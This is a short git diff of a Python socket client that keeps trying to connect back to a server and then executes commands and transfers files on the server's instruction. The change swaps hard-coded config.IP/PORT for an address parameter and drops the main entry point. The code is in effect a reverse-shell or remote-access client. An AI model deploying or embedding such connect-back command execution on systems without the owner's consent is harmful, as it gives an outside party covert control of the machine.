@@ -19,28 +19,24 @@ def shell(server: socket.socket):
         # upload [source] [target]
         elif func == "upload":
             cmd.download(server, args, config.CLIENT_VERBOSE)
-        # exec [func] [...args]
+        # exec [...args]
         elif func == "exec":
             cmd.exec(server, " ".join(args), config.CLIENT_VERBOSE)
 
 
 def connect_server(
     server: socket.socket,
+    address: tuple[str, int],
     shell: Callable[[socket.socket], None],
     timeout: int,
 ):
     while True:
         time.sleep(timeout)
         try:
-            server.connect((config.IP, config.PORT))
+            server.connect(address)
             shell(server)
             server.close()
             break
         except:
             server.close()
-            connect_server(server, shell, timeout)
-
-
-if __name__ == "__main__":
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    connect_server(sock, shell, 5)
+            connect_server(server, address, shell, timeout)
